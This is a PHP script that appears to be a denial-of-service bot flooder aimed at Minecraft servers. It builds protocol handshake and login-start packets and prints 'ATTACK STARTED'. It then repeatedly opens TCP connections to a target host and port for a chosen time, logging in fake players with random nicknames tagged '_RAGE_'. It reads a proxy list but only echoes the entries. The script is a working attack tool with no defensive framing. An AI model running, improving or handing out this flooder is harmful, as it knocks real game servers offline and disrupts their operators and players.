<?php
//Check script arguments
$argc == 5 || exit("Usage: php $argv[0] <ip>:<port> <protocol> <time> <parameter <(m(minimal) d(default))>");

//Minecraft protocol version (47 = 1.8.x, 340 = 1.12.2, 498 = 1.14.4, 754 = 1.16.4 ...)
$proto = $argv[2];

$ip = explode(":", $argv[1])[0];

$port = explode(":", $argv[1])[1];
$time = intval($argv[3]);
$param = $argv[4];



$i = 0;


//Make handshake packet

$data = "\x00";
$data .= makeVarInt($proto);
$data .= pack('c', strlen($ip)) . $ip;
$data .= pack('n', $port);
$data .= "\x02";
$handshake = pack('c', strlen($data)) . $data;

echo("
ATTACK STARTED
host: $ip
port: $port
protocol: $proto
time: $time
");

$startTime = time();
while (true) {

    if ($file = fopen("proxy.txt", "r")) {
    while(!feof($file)) {
        $line = fgets($file);
        $proxyIp = explode(":", $line)[0];
        $proxyPort = explode(":", $line)[1];
        $proxy = "$proxyIp:$proxyPort";
        $proxy = trim(preg_replace('/\s\s+/', ' ', $proxy));




    if ($startTime + $time != time()) {
        $i++;
        $nick = generateRandomString(5)."_RAGE_". generateRandomString(5);

        //Create TCP socket
        $socket = @stream_socket_client("tcp://$ip:$port", $errno, $errstr, 10);

        //Check for errors
        if ($errno > 0) {
            echo "ERROR: " . $errstr . PHP_EOL;
            continue;
        }


        if ($param == "d") {
            echo "\r| [$i/*] | $proxy -> $nick -> $ip:$port |\n";
        }
        

        //Send login handshake packet
        fwrite($socket, $handshake);

        //Make login start packet
        $data = "\x00";
        $data .= pack('c', strlen($nick)) . $nick;
        $data = pack('c', strlen($data)) . $data;

        //Send login start packet
        fwrite($socket,  $data);

    }
    else{
        exit();
    }













    }
    fclose($file);
    }


}


function makeVarInt($data) {
    if ($data < 0x80) {
        return pack('C', $data);
    }

    $bytes = [];
    while ($data > 0) {
        $bytes[] = 0x80 | ($data & 0x7f);
        $data >>= 7;
    }

    $bytes[count($bytes)-1] &= 0x7f;

    return call_user_func_array('pack', array_merge(array('C*'), $bytes));
}

function generateRandomString($length = 10) {
    $characters = '0123456789qweasdzxc';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
